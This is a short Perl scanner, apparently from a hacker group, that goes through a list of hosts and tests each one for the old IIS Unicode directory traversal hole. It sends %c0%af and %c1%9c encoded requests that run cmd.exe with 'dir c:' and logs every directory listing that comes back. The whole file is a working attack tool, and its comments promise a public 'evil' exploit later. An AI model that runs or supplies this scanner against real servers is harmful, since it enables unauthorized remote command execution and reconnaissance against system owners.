#!/usr/bin/perl 
#Root Shell Hackers
#piffy
#this is a quick scanner i threw together while supposedly doing homework in my room.
#it will go through a list of sites and check if it gives a directory listing for the new IIS hole
#it checks for both %c0%af and %c1%9c
#perhaps a public script to do some evil stuff with this exploit later... h0h0h0
#werd: all of rsh, 0x7f, hackweiser, rain forest puppy for researching the hole =]
use strict;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Response;
my $def = new LWP::UserAgent;
my @host;
print "root shell hackers\n";
print "iis cmd hole scanner\n";
print "coded by piffy\n";
print "\nWhat file contains the hosts: ";
chop (my $hosts=<STDIN>);
open(IN, $hosts) || die "\nCould not open $hosts: $!"; 
while (<IN>) 
{ 
	$host[$a] = $_; 
	chomp $host[$a]; 
	$a++; 
        $b++; 
} 
close(IN);
$a = 0; 
print "ph34r, scan started";
while ($a < $b) 
{ 
	my $url="http://$host[$a]/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ ";
	my $request = new HTTP::Request('GET', $url);
	my $response = $def->request($request);
	if ($response->is_success) {
  	print $response->content;
	open(OUT, ">>scaniis.log"); 
	print OUT "\n$host[$a] : $response->content"; 
	-close OUT; 
  	 } else {
  	print $response->error_as_HTML;
	}
	&second()
} 

sub second() {
	my $url2="http://$host[$a]/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ ";
	my $request = new HTTP::Request('GET', $url2);
	my $response = $def->request($request);
	if ($response->is_success) {
  	print $response->content;
	open(OUT, ">>scaniis.log"); 
	print OUT "\n$host[$a] : $response->content"; 
	-close OUT; 
  	 } else {
  	print $response->error_as_HTML;
	}
	$a++; 
}
